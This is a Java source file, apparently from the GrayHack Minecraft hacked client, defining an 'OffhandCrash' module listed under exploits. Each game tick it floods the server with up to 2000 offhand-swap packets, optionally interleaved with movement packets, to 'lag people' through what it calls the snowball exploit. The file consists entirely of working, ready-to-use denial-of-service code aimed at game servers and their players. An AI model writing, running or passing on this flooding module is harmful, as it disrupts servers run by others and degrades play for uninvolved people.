/*
 * This file is part of the GrayHack distribution (https://github.com/GrayDrinker420/GrayHack/).
 * Copyright (c) 2021 Gray and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package org.grayhack.module.mods;

import org.grayhack.event.events.EventTick;
import org.grayhack.eventbus.GraySubscribe;
import org.grayhack.module.Module;
import org.grayhack.module.ModuleCategory;
import org.grayhack.setting.module.SettingSlider;
import org.grayhack.setting.module.SettingToggle;

import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends Module {

	public OffhandCrash() {
		super("OffhandCrash", KEY_UNBOUND, ModuleCategory.EXPLOITS, "Lags people using the snowball exploit.",
				new SettingSlider("Switches", 0, 2000, 420, 0).withDesc("How many switches per tick."),
				new SettingToggle("Player Packet", true).withDesc("Send player packets between switches."));
	}

	@GraySubscribe
	public void onTick(EventTick event) {
		for (int i = 0; i < getSetting(0).asSlider().getValue(); i++) {
			mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN));
			if (getSetting(1).asToggle().getState())
				mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true));
		}
	}
}
